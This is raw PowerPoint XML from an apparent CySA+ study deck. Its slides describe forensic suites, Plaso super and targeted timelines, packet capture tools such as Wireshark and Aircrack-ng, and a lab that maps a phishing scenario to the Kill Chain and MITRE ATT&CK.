            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common commercial suites include AccessData FTK (Forensic Toolkit) and OpenText EnCase, while The Sleuth Kit (TSK) with its Autopsy front end is a widely used open-source alternative for file-system analysis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These tools support timeline analysis, which correlates file metadata, log entries, and artifacts into a chronological sequence so an investigator can see the order of events during an incident.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because these platforms speed up investigations, produce court-defensible reports, and surface patterns across large data sets that manual review would miss.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions naming commercial and open-source forensic suites (FTK, EnCase, The Sleuth Kit) and identifying timeline analysis as a core investigative technique.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719</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Forensics Analysis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Commercial solutions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  FTK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  EnCase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  The Sleuth Kit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Timeline analysis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720</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Timeline Analysis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Timeline analysis searches across log files, file-system metadata, and other artifacts to build a single correlated chronological timeline that an investigator can easily read to reconstruct what happened and when.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  When the exact time of the incident is unknown, analysts build a super timeline that aggregates every available timestamped artifact into one master view, commonly using the Plaso engine and its log2timeline tool.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  When the time of the incident is known, analysts build a targeted timeline, taking snapshots of the system state pre-incident and post-incident so they can compare and isolate exactly how the incident affected the system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because a coherent timeline turns scattered evidence into a clear attack narrative, pinpointing the initial compromise, lateral movement, and impact for reporting and remediation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions distinguishing a super timeline (built with Plaso when the incident time is unknown) from a targeted timeline (used when the incident time is known).</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721</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Timeline Analysis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Searches log files, artifacts to create single correlated timeline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Easily analyzed by investigators</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Plaso</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  One popular utility used to create a “super timeline”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Exact time of incident unknown</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Targeted timeline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Time of incident is known</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Take snips pre- &amp; post-incident to see how the incident effected system</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722</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Forensic Analysis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Forensic analysis frequently centers on timeline analysis, the technique of searching through many log files and artifacts to merge their timestamps into a single unified timeline of events.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Timeline analysis utilities such as Plaso automate this correlation, parsing dozens of artifact types and normalizing their timestamps into one dataset.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A super timeline is built when the analyst is not sure when the event occurred and therefore needs every available artifact folded in, whereas a targeted timeline is used when the analyst already has a good idea of when the event occurred and can focus the window.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because choosing the right timeline scope keeps an investigation efficient, avoiding drowning in noise on a super timeline when a focused targeted timeline would answer the question faster.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions that test timeline-analysis vocabulary, including the Plaso super timeline for unknown event times and the targeted timeline for known event times.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723</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Forensic Analysis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Timeline analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Search through log files to create single timeline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Timeline analysis utilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Plaso</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  “Super” timeline – not sure when the event occurred</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Targeted timeline – might know when event occurred</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724</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · PACKET CAPTURE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Packet Capture Tools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Packet capture tools record network traffic off the wire or air so analysts can inspect the actual contents of communications during and after an incident.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Wireshark is the leading graphical packet analyzer and tshark is its command-line counterpart, both included in analyst distributions such as Security Onion, and they decode protocols and let investigators filter and follow conversations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For wireless investigations the Aircrack-ng suite is standard, where airmon-ng places an adapter into monitor mode, airodump-ng captures 802.11 frames and enumerates access points and clients, and Aircrack-ng itself performs key cracking against captured handshakes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because captured packets provide ground-truth evidence of data exfiltration, command-and-control, and credential theft that logs alone may not reveal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions matching tools to tasks, such as Wireshark or tshark for full packet capture and the Aircrack-ng suite (airmon-ng, airodump-ng) for wireless capture and analysis.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725</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · PACKET CAPTURE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Packet Capture Tools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tshark (onion)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Wireshark (onion)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Network general</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Aircrack-ng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Airmon-ng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Airodump-ng</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726</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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TOPIC 3 · PRACTICE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Hands-On: Labs 20–25</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6 step-by-step labs applying Incident Response and Management in the Killercoda playground and free tools.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727</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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20 — Cyber Kill Chain and ATT&amp;CK Mapping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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will walk a single intrusion scenario through Lockheed Martin's Cyber Kill Chain, then map the same scenario to the MITRE ATT&amp;CK Navigator and the Diamond Model. This maps to CySA+ 3.1 (Cyber kill chains, Diamond Model of Intrusion Analysis, MITRE ATT&amp;CK, OSSTMM, OWASP Testing Guide).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Web — MITRE ATT&amp;CK Navigator</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728</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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20 — Reference Diagram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g_34df8d5619.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1624647" y="1783080"/>
            <a:ext cx="3485262" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_0605d5ac69.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636" y="2754434"/>
            <a:ext cx="5180076" cy="2492132"/>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729</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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20 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: The scenario</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>&gt; A finance department user opens an invoice attachment from alerts@secur1ty-paypal.com (Lab 8).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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695651"/>
            <a:ext cx="91440" cy="78455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05840" y="285932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05840" y="2859328"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Map to the 7 stages of the Lockheed Cyber Kill Chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Pick one stage as the earliest detection opportunity — that becomes the "earliest kill" recommendation in the incident report (Lab 27).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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608222"/>
            <a:ext cx="91440" cy="78455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05840" y="3771899"/>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05840" y="3771899"/>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1" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Open MITRE ATT&amp;CK Navigator</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Browser: https://mitre-attack.github.io/attack-navigator/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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520793"/>
            <a:ext cx="91440" cy="78455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05840" y="468447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05840" y="4684470"/>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26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Tag the techniques used in the scenario</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>In the search box, find and select each of these.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Diamond Model of Intrusion Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
